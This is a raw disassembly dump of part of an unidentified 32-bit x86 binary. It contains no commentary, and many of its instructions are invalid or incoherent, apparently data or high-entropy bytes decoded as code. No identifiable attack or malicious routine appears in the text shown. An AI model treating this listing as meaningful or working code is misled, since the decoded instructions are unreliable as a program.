  414a84:	cmp    cl,BYTE PTR [edi+0x28]
  414a87:	dec    edi
  414a88:	push   ds
  414a89:	ret    0xc31f
  414a8c:	psrlq  mm0,QWORD PTR [eax]
  414a8f:	shl    BYTE PTR [eax-0x20],1
  414a92:	jno    0x414a75
  414a94:	aas    
  414a95:	dec    edi
  414a96:	pusha  
  414a97:	dec    edi
  414a98:	cmp    cl,BYTE PTR [edi+0x4e]
  414a9b:	dec    edi
  414a9c:	cmp    eax,0x314f6b4f
  414aa1:	dec    edi
  414aa2:	dec    esp
  414aa3:	dec    edi
  414aa4:	xor    al,0x4f
  414aa6:	cmp    cl,BYTE PTR [edi+0x36]
  414aa9:	dec    edi
  414aaa:	push   ds
  414aab:	rcr    BYTE PTR [edi],cl
  414aad:	ror    DWORD PTR [edi],cl
  414aaf:	jecxz  0x414ab1
  414ab1:	loopne 0x414b23
  414ab3:	lock jno 0x414aa7
  414ab6:	aas    
  414ab7:	dec    edi
  414ab8:	ins    DWORD PTR es:[edi],dx
  414ab9:	dec    edi
  414aba:	cmp    cl,BYTE PTR [edi+0x5f]
  414abd:	dec    edi
  414abe:	cmp    eax,0x3e4f4a4f
  414ac3:	dec    edi
  414ac4:	cmp    cl,BYTE PTR [edi+0x3f]
  414ac7:	dec    edi
  414ac8:	push   ds
  414ac9:	loop   0x414aea
  414acb:	jecxz  0x414adc
  414acd:	repz add al,dh
  414ad0:	jo     0x414ad2
  414ad2:	jno    0x414ad5
  414ad4:	jo     0x414ae6
  414ad6:	jno    0x414ae9
  414ad8:	ds dec edi
  414ada:	jg     0x414b2b
  414adc:	cmp    cl,BYTE PTR [edi+0x53]
  414adf:	dec    edi
  414ae0:	cmp    al,0x4f
  414ae2:	push   0x4f
  414ae4:	ds dec edi
  414ae6:	dec    ebp
  414ae7:	dec    edi
  414ae8:	xor    ecx,DWORD PTR [edi+0x3a]
  414aeb:	dec    edi
  414aec:	xor    eax,0x1f021e4f
  414af1:	add    ecx,DWORD PTR [edi]
  414af3:	adc    eax,DWORD PTR [eax]
  414af5:	adc    BYTE PTR [eax+0x20],dh
  414af8:	jno    0x414b1b
  414afa:	aas    
  414afb:	dec    edi
  414afc:	add    BYTE PTR [eax],al
  414afe:	xchg   BYTE PTR [ecx+0x41],cl
  414b01:	add    BYTE PTR [edx+0x4b],bh
  414b04:	inc    ecx
  414b05:	add    BYTE PTR [edx-0x41ffbeb5],al
  414b0b:	dec    ebp
  414b0c:	inc    ecx
  414b0d:	add    BYTE PTR [esi],ah
  414b0f:	dec    ebp
  414b10:	inc    ecx
  414b11:	add    BYTE PTR [esi+0x6200414d],ch
  414b17:	dec    ebx
  414b18:	inc    ecx
  414b19:	add    BYTE PTR [esi+0x4b],ah
  414b1c:	inc    ecx
  414b1d:	add    BYTE PTR [esi-0x35ffbeb3],ah
  414b23:	dec    ebx
  414b24:	inc    ecx
  414b25:	add    BYTE PTR [ecx-0x49076357],dh
  414b2b:	mov    edx,0x4b7ef89c
  414b30:	inc    ecx
  414b31:	add    dh,bl
  414b33:	dec    esp
  414b34:	inc    ecx
  414b35:	add    dl,dh
  414b37:	dec    esp
  414b38:	inc    ecx
  414b39:	add    dh,bh
  414b3b:	dec    esp
  414b3c:	inc    ecx
  414b3d:	add    BYTE PTR [esi],cl
  414b3f:	dec    ebp
  414b40:	inc    ecx
  414b41:	add    BYTE PTR [esi-0x7dffbeb5],dh
  414b47:	dec    ecx
  414b48:	inc    ecx
  414b49:	add    dh,dl
  414b4b:	dec    ebx
  414b4c:	inc    ecx
  414b4d:	add    dh,al
  414b4f:	dec    ebx
  414b50:	inc    ecx
  414b51:	add    dl,al
  414b53:	dec    ebp
  414b54:	inc    ecx
  414b55:	add    BYTE PTR [esi],dh
  414b57:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  414b5e:	mov    cl,BYTE PTR [ebx+0x41]
  414b61:	add    BYTE PTR [eax-0x737ee9e4],bl
  414b67:	or     eax,0x705
  414b6c:	inc    eax
  414b6d:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  414b71:	fstp   st(3)
  414b73:	inc    esp
  414b74:	inc    ebx
  414b75:	add    BYTE PTR [edx+0x68],dh
  414b78:	inc    ebp
  414b79:	inc    ecx
  414b7a:	mov    edx,?
  414b7c:	jne    0x414be0
  414b7e:	mov    ebp,gs
  414b80:	inc    BYTE PTR [edi]
  414b82:	mov    edi,0x7205a3fa
  414b87:	dec    ebx
  414b88:	inc    ecx
  414b89:	add    BYTE PTR [ecx],bh
  414b8b:	xchg   ebp,eax
  414b8c:	pushf  
  414b8d:	clc    
  414b8e:	cmp    DWORD PTR [esi-0x6ac70764],edx
  414b94:	pushf  
  414b95:	clc    
  414b96:	cmp    edx,DWORD PTR [ebp-0x6ac50764]
  414b9c:	pushf  
  414b9d:	clc    
  414b9e:	cmp    eax,0x3cf89c95
  414ba3:	xchg   ebp,eax
  414ba4:	pushf  
  414ba5:	clc    
  414ba6:	aas    
  414ba7:	xchg   ebp,eax
  414ba8:	pushf  
  414ba9:	clc    
  414baa:	ds xchg ebp,eax
  414bac:	pushf  
  414bad:	clc    
  414bae:	and    DWORD PTR [ebp-0x6ad90764],edx
  414bb4:	pushf  
  414bb5:	clc    
  414bb6:	jmp    0x4149:0x7a6003f9
  414bbd:	add    BYTE PTR [edi+ecx*1+0x49590043],dh
  414bc4:	imul   si,WORD PTR [esi],0xff85
  414bc8:	pushf  
  414bc9:	clc    
  414bca:	popf   
  414bcb:	jmp    0xac75320
  414bd0:	add    BYTE PTR [eax],al
  414bd2:	jbe    0x414c1d
  414bd4:	inc    ecx
  414bd5:	add    BYTE PTR [ebx+0xe040b],bl
	...
  414c0b:	adc    BYTE PTR [eax+0x0],al
  414c0e:	fcomp  DWORD PTR [edi]
  414c10:	inc    ebx
  414c11:	add    BYTE PTR [eax],al
  414c13:	add    BYTE PTR [eax],al
  414c15:	add    BYTE PTR [ecx+0x0],cl
  414c18:	inc    esp
  414c19:	add    BYTE PTR [ecx+0x0],ch
  414c1c:	add    BYTE PTR fs:[ebx+0x0],cl
  414c20:	dec    edx
  414c21:	add    BYTE PTR [ebx+0x0],cl
  414c24:	dec    edx
  414c25:	add    BYTE PTR [eax+eax*1+0x6b],al
  414c29:	add    BYTE PTR [eax+eax*1+0x6a],ch
  414c2d:	add    BYTE PTR [eax+eax*1+0x4c],al
  414c31:	add    BYTE PTR [ecx+0x0],cl
  414c34:	inc    esp
  414c35:	add    BYTE PTR [eax+eax*1+0x49],cl
  414c39:	add    BYTE PTR [ebp+0x0],dl
  414c3c:	dec    edx
  414c3d:	add    BYTE PTR [ebx+0x0],cl
  414c40:	inc    esp
  414c41:	add    BYTE PTR [eax+eax*1+0x4a],cl
  414c45:	add    BYTE PTR [ebx+0x0],cl
  414c48:	dec    eax
  414c49:	add    BYTE PTR [eax+eax*1+0x4a],al
	...
  414c55:	add    BYTE PTR [ebx+ebp*2+0x6a],ah
  414c59:	jae    0x414cc6
  414c5b:	ins    BYTE PTR es:[edi],dx
  414c5c:	popa   
  414c5d:	imul   ebp,DWORD PTR [edx+ebp*2+0x4c],0x4b
  414c62:	dec    ecx
  414c63:	dec    edx
  414c64:	inc    esp
  414c65:	inc    esi
  414c66:	ins    BYTE PTR es:[edi],dx
  414c67:	imul   ebp,DWORD PTR [ebx+0x75],0x736c6466
  414c6e:	imul   ebp,DWORD PTR [ecx+0x68],0x67
  414c72:	ins    BYTE PTR es:[edi],dx
  414c73:	jae    0x414ce0
  414c75:	push   0x66
  414c77:	ins    BYTE PTR es:[edi],dx
  414c78:	imul   ecx,DWORD PTR [edx+0x4b],0x44
  414c7c:	imul   sp,WORD PTR [esi+eiz*2+0x68],0x73
  414c82:	imul   esp,DWORD PTR [edi+0x66],0x68
  414c86:	jae    0x414cec
  414c88:	imul   esi,DWORD PTR [ebp+0x6b],0x64756679
  414c8f:	imul   esi,DWORD PTR [ebx+0x6b],0x486a6b68
  414c96:	dec    ebx
  414c97:	dec    edx
  414c98:	inc    esp
  414c99:	inc    esi
  414c9a:	push   0x756b7364
  414c9f:	outs   dx,DWORD PTR ds:[si]
  414ca1:	imul   esi,DWORD PTR [ebx+0x66],0x6b677564
  414ca8:	push   0x66
  414caa:	fs jae 0x414d15
  414cad:	imul   ebp,DWORD PTR [si+0x66],0x68
  414cb2:	ins    BYTE PTR es:[edi],dx
  414cb3:	imul   esp,DWORD PTR [edi+0x6a],0x75
  414cb7:	push   0x6a6b6466
  414cbc:	jne    0x414d25
  414cbe:	jns    0x414d24
  414cc0:	imul   si,WORD PTR [di+0x66],0x6764
  414cc7:	jne    0x414d35
  414cc9:	fs pushw 0x6c67
  414cce:	push   0x68
  414cd0:	data16 add BYTE PTR fs:[eax],al
  414cd4:	add    BYTE PTR [eax],al
  414cd6:	add    BYTE PTR [eax],al
  414cd8:	add    BYTE PTR [eax],al
  414cda:	xor    edx,DWORD PTR [ebx]
  414cdc:	inc    ecx
  414cdd:	add    BYTE PTR [ebp+0x4f],dl
  414ce0:	pop    edi
  414ce1:	dec    edi
  414ce2:	dec    esp
  414ce3:	dec    edi
  414ce4:	dec    eax
  414ce5:	dec    edi
  414ce6:	pop    edi
  414ce7:	dec    edi
  414ce8:	push   esi
  414ce9:	dec    edi
  414cea:	or     eax,0x3a4f0c4f
  414cef:	dec    edi
  414cf0:	add    BYTE PTR [eax],al
  414cf2:	push   ecx
  414cf3:	dec    edi
  414cf4:	pop    esi
  414cf5:	dec    edi
  414cf6:	push   ebx
  414cf7:	dec    edi
  414cf8:	or     eax,0x3a4f0c4f
  414cfd:	dec    edi
  414cfe:	dec    edi
  414cff:	dec    edi
  414d00:	dec    ebp
  414d01:	dec    edi
  414d02:	pop    edi
  414d03:	dec    edi
  414d04:	dec    esp
  414d05:	dec    edi
  414d06:	or     eax,0x3a4f0c4f
  414d0b:	dec    edi
  414d0c:	add    BYTE PTR [eax],al
  414d0e:	dec    ebp
  414d0f:	dec    edi
  414d10:	push   edx
  414d11:	dec    edi
  414d12:	push   esi
  414d13:	dec    edi
  414d14:	inc    ecx
  414d15:	dec    edi
  414d16:	pop    ebx
  414d17:	dec    edi
  414d18:	dec    edx
  414d19:	dec    edi
  414d1a:	push   ebx
  414d1b:	dec    edi
  414d1c:	cmp    cl,BYTE PTR [edi+0x0]
  414d1f:	add    BYTE PTR [eax],al
  414d21:	add    BYTE PTR [eax],al
  414d23:	add    BYTE PTR [eax],al
  414d25:	add    BYTE PTR [esi+0x7d],ch
  414d28:	outs   dx,BYTE PTR ds:[esi]
  414d29:	lea    ebp,[esi-0x63]
  414d2c:	outs   dx,BYTE PTR ds:[esi]
  414d2d:	lods   eax,DWORD PTR ds:[esi]
  414d2e:	outs   dx,BYTE PTR ds:[esi]
  414d2f:	mov    ebp,0xdd6ecd6e
  414d34:	outs   dx,BYTE PTR ds:[esi]
  414d35:	in     eax,dx
  414d36:	outs   dx,BYTE PTR ds:[esi]
  414d37:	std    
  414d38:	outs   dx,BYTE PTR ds:[esi]
  414d39:	or     eax,0x2d6e1d6e
  414d3e:	outs   dx,BYTE PTR ds:[esi]
  414d3f:	cmp    eax,0x6d6e5d6e
  414d44:	outs   dx,BYTE PTR ds:[esi]
  414d45:	jb     0x414db5
  414d47:	jae    0x414db7
  414d49:	jo     0x414db9
  414d4b:	jno    0x414dbb
  414d4d:	jbe    0x414dbd
  414d4f:	ja     0x414dbf
  414d51:	je     0x414dc1
  414d53:	jne    0x414dc3
  414d55:	mov    ch,BYTE PTR [esi-0x75]
  414d58:	outs   dx,BYTE PTR ds:[esi]
  414d59:	mov    BYTE PTR [esi-0x77],ch
  414d5c:	outs   dx,BYTE PTR ds:[esi]
  414d5d:	mov    gs,WORD PTR [esi+0x7c]
  414d60:	pop    esi
  414d61:	jge    0x414db1
  414d63:	jge    0x414d23
  414d65:	jge    0x414db7
  414d67:	(bad)  
  414d68:	jno    0x414dda
  414d6a:	mov    cl,0xb1
  414d6c:	outs   dx,BYTE PTR ds:[esi]
  414d6d:	jae    0x414dec
  414d6f:	bound  esp,QWORD PTR [edx+0x7c265fc6]
  414d75:	add    BYTE PTR [ecx+0x17],al
  414d78:	mov    bl,0x56
  414d7a:	mov    cl,0xf4
  414d7c:	inc    edx
  414d7d:	aaa    
  414d7e:	inc    edx
  414d7f:	jle    0x414d12
  414d81:	jno    0x414ddb
  414d83:	mov    cl,0x4
  414d85:	imul   esp,DWORD PTR [eax-0x70282bf8],0x5
  414d8c:	inc    esp
  414d8d:	xlat   BYTE PTR ds:[ebx]
  414d8e:	leave  
  414d8f:	xchg   ebx,eax
  414d90:	inc    eax
  414d91:	adc    eax,ecx
  414d93:	jge    0x414d60
  414d95:	faddp  st(7),st
  414d97:	leave  
  414d98:	xchg   BYTE PTR [esi+0x1fa23208],ah
  414d9e:	fs icebp 
  414da0:	dec    eax
  414da1:	(bad)  
  414da2:	leave  
  414da3:	sbb    cl,cl
  414da5:	jno    0x414d93
  414da7:	(bad)  [ebx+0x7]
  414daa:	ror    BYTE PTR [ebx+0x41],cl
  414dad:	add    BYTE PTR [ebp+0x2f],al
  414db0:	shl    BYTE PTR [edx],0x2c
  414db3:	xor    eax,DWORD PTR [ecx+0x0]
  414db6:	inc    esi
  414db7:	push   ebx
  414db8:	outs   dx,DWORD PTR ds:[esi]
  414db9:	push   ebx
  414dba:	push   0x4b
  414dbc:	inc    ecx
  414dbd:	add    dh,cl
  414dbf:	dec    ebx
  414dc0:	inc    ecx
  414dc1:	add    BYTE PTR [ebp+ebp*8+0x712],cl
	...
  414de4:	add    BYTE PTR [eax],al
  414de6:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  414ded:	pop    ecx
  414dee:	outs   dx,BYTE PTR ds:[esi]
  414def:	jbe    0x414e69
  414df1:	jns    0x414e47
  414df3:	push   ecx
  414df4:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  414df8:	je     0x414e5b
	...
  414e0e:	jp     0x414e64
  414e10:	arpl   WORD PTR [ecx+0x4b],cx
  414e13:	push   edx
  414e14:	imul   ebp,DWORD PTR [eax+0x53],0x4746536f
  414e1b:	push   0x66495949
  414e20:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  414e24:	push   esi
  414e25:	jb     0x414e8f
  414e27:	add    BYTE PTR [ebx+0x51],al
  414e2a:	ins    BYTE PTR es:[edi],dx
  414e2b:	pop    eax
  414e2c:	ja     0x414e7b
  414e2e:	je     0x414ea6
  414e30:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  414e34:	in     al,0xf5
  414e36:	jnp    0x414e86
  414e38:	jnp    0x414e08
  414e3a:	cmc    
  414e3b:	push   DWORD PTR [ebx]
  414e3d:	sar    ebx,cl
  414e3f:	(bad)  
  414e41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e42:	jmp    0x126da72
  414e47:	add    dh,dh
  414e49:	add    BYTE PTR [eax],al
  414e4b:	add    ah,cl
  414e4d:	(bad)  
  414e4e:	cli    
  414e4f:	jns    0x414e7a
  414e51:	or     eax,0xa7e319fe
  414e56:	retf   0x24e0
  414e59:	leave  
  414e5a:	icebp  
  414e5b:	or     dl,BYTE PTR cs:[eax+0x2d]
  414e5f:	test   BYTE PTR [ecx-0x7b5c4dd5],0xa6
  414e66:	jmp    0x9807:0xb31f84bf
  414e6d:	jns    0x414e48
  414e6f:	mov    ebx,0x75be4667
  414e74:	fisub  DWORD PTR [edx-0x48]
  414e77:	sub    al,0x8
  414e79:	mov    edi,0x2d8706e6
  414e7e:	pushf  
  414e7f:	jle    0x414e54
  414e81:	pop    ebx
  414e82:	cmp    ebp,ebx
  414e84:	(bad)  
  414e86:	iret   
  414e87:	pop    ebp
  414e88:	ins    DWORD PTR es:[edi],dx
  414e89:	mov    dl,0xf9
  414e8b:	arpl   WORD PTR [edx],bx
  414e8d:	inc    edx
  414e8e:	fstp   TBYTE PTR [esi+0x1a563474]
  414e94:	popf   
  414e95:	pop    edi
  414e96:	leave  
  414e97:	mov    ebx,0x22a8784
  414e9c:	pop    eax
  414e9d:	add    eax,0x59f52419
  414ea2:	mov    ch,0x2
  414ea4:	addr16 stc 
  414ea6:	push   ds
  414ea7:	nop
  414ea8:	mov    bl,0x26
  414eaa:	mov    edx,0x548c01c1
  414eaf:	test   BYTE PTR [ebx],0x42
  414eb2:	sbb    DWORD PTR [eax-0x144486e9],ebp
  414eb8:	mov    al,ds:0xc2574cf0
  414ebd:	loopne 0x414f3d
  414ebf:	dec    ebp
  414ec0:	cmc    
  414ec1:	mov    esp,0x1d13a154
  414ec6:	add    BYTE PTR [ebx],0x62
  414ec9:	cmp    DWORD PTR [edx+0x49d85909],ebp
  414ecf:	xchg   esp,eax
  414ed0:	mov    ch,0x6b
  414ed2:	pop    esi
  414ed3:	mov    bh,BYTE PTR [ecx+0x77]
  414ed6:	mov    ah,0x8f
  414ed8:	pop    esp
  414ed9:	jbe    0x414efd
  414edb:	cmp    BYTE PTR [esi+0x767f8c2c],0x99
  414ee2:	pop    edx
  414ee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ee4:	push   ds
  414ee5:	adc    ebp,edx
  414ee7:	pop    edx
  414ee8:	push   ecx
  414ee9:	cli    
  414eea:	in     al,dx
  414eeb:	scas   eax,DWORD PTR es:[edi]
  414eec:	adc    edx,ecx
  414eee:	jecxz  0x414e77
  414ef0:	push   es
  414ef1:	and    edi,DWORD PTR [eax+0xc3dc266]
  414ef7:	push   esi
  414ef8:	inc    ebp
  414ef9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414efa:	pop    edx
  414efb:	call   0x31d3:0x2a2fbe25
  414f02:	push   edi
  414f03:	or     DWORD PTR [ebp-0x44d4fb8d],esi
  414f09:	aaa    
  414f0a:	cmp    al,0xa4
  414f0c:	add    al,0x2f
  414f0e:	and    DWORD PTR [ebp+0x78],ebx
  414f11:	mov    ch,0x10
  414f13:	not    BYTE PTR [ecx+eax*8-0x7a]
  414f17:	or     esi,eax
  414f19:	push   esp
  414f1a:	ret    
  414f1b:	test   BYTE PTR [ebp-0x79294a36],dh
  414f21:	sub    al,0xf9
  414f23:	mov    ebx,0xc7d63801
  414f28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f29:	and    DWORD PTR [esi+0x1865f616],edx
  414f2f:	mov    edi,0xdcdc824f
  414f34:	inc    ecx
  414f35:	ret    0x5ad0
  414f38:	push   esp
  414f39:	xchg   esi,eax
  414f3a:	xchg   DWORD PTR [edx],ebp
  414f3c:	push   edi
  414f3d:	or     DWORD PTR [edi],0xa4f6ec
	...
  414fb3:	add    BYTE PTR [edx-0x26],bl
  414fb6:	push   esi
  414fb7:	pusha  
  414fb8:	(bad)  
  414fb9:	in     al,dx
  414fba:	jle    0x414fb6
  414fbc:	cs pop ebx
  414fbe:	pop    ss
  414fbf:	ret    0x8a1c
  414fc2:	sub    BYTE PTR [edx+0xe682],dl
  414fc8:	test   BYTE PTR [eax],0x0
  414fcb:	add    BYTE PTR [esi+0x63a7c6ec],dh
  414fd1:	sbb    al,0xec
  414fd3:	and    cl,BYTE PTR [edi+edi*2]
  414fd6:	js     0x414f84
  414fd8:	cmp    eax,0xda1d8c4
  414fdd:	es lahf 
  414fdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fe0:	bound  ebp,QWORD PTR [ebp-0x7301f8fb]
  414fe6:	mov    bh,0x38
  414fe8:	cmp    BYTE PTR [edx+0x4e],0xac
  414fec:	jno    0x414feb
  414fee:	loopne 0x415009
  414ff0:	ja     0x415035
  414ff2:	dec    ebp
  414ff3:	push   cs
  414ff4:	adc    BYTE PTR [edi],ah
  414ff6:	sbb    BYTE PTR [ebx-0x68607f1d],ch
  414ffc:	jno    0x415040
  414ffe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fff:	push   ebp
  415000:	inc    ecx
  415001:	icebp  
  415002:	add    DWORD PTR [edi+edx*1],esi
  415005:	or     eax,esi
  415007:	in     al,dx
  415008:	mov    al,0xfe
  41500a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41500b:	aaa    
  41500c:	jmp    0x616:0x5dace33e
  415013:	stos   DWORD PTR es:[edi],eax
  415014:	mov    ebp,0xc01bb3e7
  415019:	mov    eax,0xc44aa2c7
  41501e:	xchg   esp,eax
  41501f:	ss (bad) 
  415021:	ds mov bl,0x22
  415024:	jnp    0x414fee
  415026:	mov    ebx,0xc8c5561c
  41502b:	jmp    0x41504d
  41502d:	dec    ebp
  41502e:	jb     0x415099
  415030:	mov    al,ds:0x7a067ca3
  415035:	xor    al,0x14
  415038:	aam    0x73
  41503a:	adc    DWORD PTR [ebp+0x59],ebx
  41503d:	mov    dh,0xad
  41503f:	push   esi
  415040:	xor    al,0x11
  415042:	out    dx,al
  415043:	and    edx,0x772231b6
  415049:	push   ebp
  41504a:	(bad)  
  41504b:	push   eax
  41504c:	xchg   BYTE PTR [eax-0x53],cl
  41504f:	jbe    0x41507e
  415051:	sub    al,0xe2
  415053:	xchg   ecx,esp
  415055:	mulps  xmm0,XMMWORD PTR [ecx-0x70]
  415059:	inc    ecx
  41505a:	sub    eax,0xb5ec8a82
  41505f:	iret   
  415060:	int    0x8f
  415062:	sbb    bl,BYTE PTR [eax+0x5f]
  415065:	add    al,0x50
  415067:	mov    ebx,0xd32327f3
  41506c:	jo     0x414ff7
  41506e:	push   eax
  41506f:	mov    eax,0xb0c7f4c2
  415074:	test   DWORD PTR [ecx],ebx
  415076:	lock das 
  415078:	or     ebx,esi
  41507a:	pop    edx
  41507b:	in     al,dx
  41507c:	mov    eax,ds:0x4074e16a
  415081:	xchg   esi,eax
  415082:	stc    
  415083:	inc    DWORD PTR [eax-0x5f45c754]
  415089:	sbb    ebx,DWORD PTR [ebp-0x27454951]
  41508f:	sbb    DWORD PTR [esi+0x3d],eax
  415092:	mov    edi,0x6e86b7d3
  415097:	fcmovnb st,st(4)
  415099:	jecxz  0x41506e
  41509b:	(bad)  
  41509c:	daa    
  41509d:	call   FWORD PTR [edi+0x1bce2a8c]
  4150a3:	ds cs loop 0x4150ab
  4150a7:	fisttp WORD PTR [ebp+0x28fbe617]
  4150ad:	rcr    DWORD PTR [esi+ebx*2+0x79],cl
  4150b1:	push   esp
  4150b2:	dec    eax
  4150b3:	xchg   edx,eax
  4150b4:	and    dh,0x60
  4150b7:	loop   0x4150f0
  4150b9:	retf   
  4150ba:	lds    edx,FWORD PTR [esi+esi*4+0x2ee41060]
  4150c1:	lds    eax,FWORD PTR [eax]
	...
  415133:	add    BYTE PTR [edx],al
  415135:	adc    al,BYTE PTR [ecx]
  415137:	mov    ds:0xb3a2b311,eax
  41513c:	adc    ah,BYTE PTR [esi+0x321ec4d9]
  415142:	mov    ah,0xdf
  415144:	js     0x41512d
  415146:	add    BYTE PTR [eax],al
  415148:	test   BYTE PTR [eax],0x0
  41514b:	add    BYTE PTR [edx+0x4a89b0d1],ch
  415151:	sub    edx,DWORD PTR [eax-0xbfb6a91]
  415157:	daa    
  415158:	js     0x41516c
  41515a:	clc    
  41515b:	aas    
  41515c:	adc    BYTE PTR [eax],bh
  41515e:	sub    ebx,DWORD PTR [edi+0x5ea87bae]
  415164:	sbb    eax,0x94e7a0bd
  415169:	popf   
  41516a:	inc    edx
  41516b:	out    dx,al
  41516c:	dec    esi
  41516d:	in     al,dx
  41516e:	add    bh,bh
  415170:	jl     0x415126
  415172:	cmp    eax,0x63ad9b7b
  415177:	mov    esi,0x632edf8f
  41517c:	jns    0x41512c
  41517e:	dec    ecx
  41517f:	outs   dx,DWORD PTR ds:[esi]
  415180:	leave  
  415181:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415182:	shr    DWORD PTR [esi-0x72583bef],cl
  415188:	push   ss
  415189:	jne    0x4151bd
  41518b:	js     0x4151f6
  41518d:	aad    0x26
  41518f:	in     al,dx
  415190:	inc    ebx
  415191:	push   0xffffffd8
  415193:	mov    dl,0x5b
  415195:	outs   dx,DWORD PTR ds:[esi]
  415196:	(bad)  
  415197:	aam    0x41
  415199:	(bad)  
  41519a:	out    0x2e,eax
  41519c:	jae    0x4151ff
  41519e:	iret   
  41519f:	call   0xcf47:0xee42cf16
  4151a6:	pop    esi
  4151a7:	and    DWORD PTR [ebp+esi*4+0x676fbf63],0x9726ade3
  4151b2:	in     al,0xcb
  4151b4:	into   
  4151b5:	push   ebp
  4151b6:	push   edi
  4151b7:	js     0x41522f
  4151b9:	inc    eax
  4151ba:	outs   dx,BYTE PTR ds:[esi]
  4151bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151bc:	and    DWORD PTR [esi+0x6],edi
  4151bf:	xor    DWORD PTR [edx],edx
  4151c1:	mov    ebx,0xd1c80581
  4151c6:	in     al,0x5
  4151c8:	(bad)  
  4151ca:	xor    dl,BYTE PTR [esi]
  4151cc:	cmp    DWORD PTR [ebp-0x45cd87d2],eax
  4151d2:	pop    es
  4151d3:	mov    ah,al
  4151d5:	jne    0x415185
  4151d7:	mov    ebx,ds
  4151d9:	xor    al,0x17
  4151db:	add    eax,0xdf68dbd7
  4151e0:	dec    edx
  4151e1:	test   DWORD PTR [edi-0x6d],edx
  4151e4:	inc    edx
  4151e5:	rcl    DWORD PTR [edi-0xf],cl
  4151e8:	test   eax,0x9d75fc0f
  4151ed:	les    ebp,FWORD PTR [esi+ebp*2]
  4151f0:	xor    dl,BYTE PTR [ecx+esi*1+0x2399d0aa]
  4151f7:	cmp    al,0xb4
  4151f9:	rcl    DWORD PTR [edi+ebp*1-0x59],cl
  4151fd:	jne    0x41521a
  4151ff:	repnz or esi,DWORD PTR [edx+ebp*2]
  415203:	fwait
  415204:	jb     0x41527e
  415206:	xor    eax,0x3e7b118b
  41520b:	ins    WORD PTR es:[edi],dx
  41520d:	push   edi
  41520e:	pop    eax
  41520f:	or     esi,DWORD PTR ds:0x3da20a9a
  415215:	or     ch,dh
  415217:	dec    ebp
  415218:	dec    esi
  415219:	fcom   DWORD PTR [esi+0x2cea094]
  41521f:	inc    eax
  415220:	cwde   
  415221:	aam    0xff
  415223:	add    eax,0x6f7e2428
  415228:	xor    dh,cl
  41522a:	std    
  41522b:	sub    dh,BYTE PTR [ebp+0x58bcee82]
  415231:	add    esp,esp
  415233:	mov    BYTE PTR [esi+edi*1],dl
  415236:	sbb    BYTE PTR [ebp+0x67],ah
  415239:	ja     0x415266
  41523b:	cdq    
  41523c:	sbb    dl,BYTE PTR [ebp+0x57]
  41523f:	mov    eax,0x8672
	...
  4152b4:	add    DWORD PTR [ecx-0x2122293],eax
  4152ba:	mov    cl,0xdd
  4152bc:	stos   BYTE PTR es:[edi],al
  4152bd:	dec    edx
  4152be:	out    0x6e,al
  4152c0:	mov    ecx,0x6eeafd5c
  4152c5:	call   0x13752ca
  4152ca:	add    BYTE PTR [eax],al
  4152cc:	and    eax,0xc53696bf
  4152d1:	test   BYTE PTR [esp+eiz*8],bh
  4152d4:	mov    dh,dh
  4152d6:	loopne 0x415338
  4152d8:	clc    
  4152d9:	push   es
  4152da:	scas   al,BYTE PTR es:[edi]
  4152db:	add    edi,DWORD PTR [ecx-0x53d37e2]
  4152e1:	xchg   BYTE PTR [edi+0x41],dh
  4152e4:	xor    BYTE PTR [edi],cl
  4152e6:	mov    WORD PTR [edi+0x30],ds
  4152e9:	lods   eax,DWORD PTR ds:[esi]
  4152ea:	(bad)  
  4152eb:	popa   
  4152ec:	mov    eax,ds:0x54d46c48
  4152f1:	adc    eax,0xb61cc799
  4152f6:	call   0x2cbe:0xa9665876
  4152fd:	mov    ecx,edx
  4152ff:	inc    ebx
  415300:	pop    ebp
  415301:	in     ax,dx
  415303:	jecxz  0x4152ce
  415305:	(bad)  
  415306:	adc    eax,DWORD PTR [ebp*4-0x1ef68f77]
  41530d:	push   edi
  41530e:	mov    esi,0x7f100848
  415313:	xor    eax,0x9f4cfccc
  415318:	nop
  415319:	mov    dh,0xac
  41531b:	pop    es
  41531c:	cdq    
  41531d:	ins    DWORD PTR es:[edi],dx
  41531e:	xchg   ebx,eax
  41531f:	test   eax,0x248c94f8
  415324:	inc    eax
  415325:	inc    eax
  415326:	mov    dl,0x93
  415328:	enter  0x75f,0x96
  41532c:	stos   BYTE PTR es:[edi],al
  41532d:	dec    ecx
  41532e:	(bad)  
  41532f:	push   ebx
  415330:	xor    eax,0xdddb03dc
  415335:	mov    BYTE PTR [ebx-0x1022456d],dh
  41533b:	push   es
  41533c:	dec    esp
  41533d:	test   eax,0x11a6487
  415342:	out    dx,al
  415343:	call   0xa44f0620
  415348:	aam    0x67
  41534a:	push   edx
  41534b:	sub    eax,0xf103de3
  415350:	or     bh,BYTE PTR cs:[eax-0x2]
  415354:	sub    eax,ebx
  415356:	or     BYTE PTR [eax-0x1bb24375],ah
  41535c:	fucomp st(5)
  41535e:	fisttp WORD PTR [ecx+0x56]
  415361:	jmp    0x41533e
  415363:	cmp    bh,BYTE PTR [eax-0x25]
  415366:	sub    ch,al
  415368:	jb     0x4153db
  41536a:	pop    esp
  41536b:	sbb    eax,0x3de07297
  415370:	sub    eax,0x88fead07
  415375:	pusha  
  415376:	lea    edx,[ebx+0x34329afd]
  41537c:	pop    eax
  41537d:	fld    TBYTE PTR [ebx+ebx*1-0x69]
  415381:	cmp    ebx,0x34
  415384:	sub    ch,BYTE PTR [edx+0x1]
  415387:	arpl   WORD PTR ds:0xe68859ab,bx
  41538d:	push   cs
  41538e:	adc    eax,ecx
  415390:	hlt    
  415391:	out    dx,eax
  415392:	xor    eax,0xfdda21b6
  415397:	dec    eax
  415398:	sbb    al,BYTE PTR [eax-0x241b7d0]
  41539e:	cmp    esp,edx
  4153a0:	pop    ss
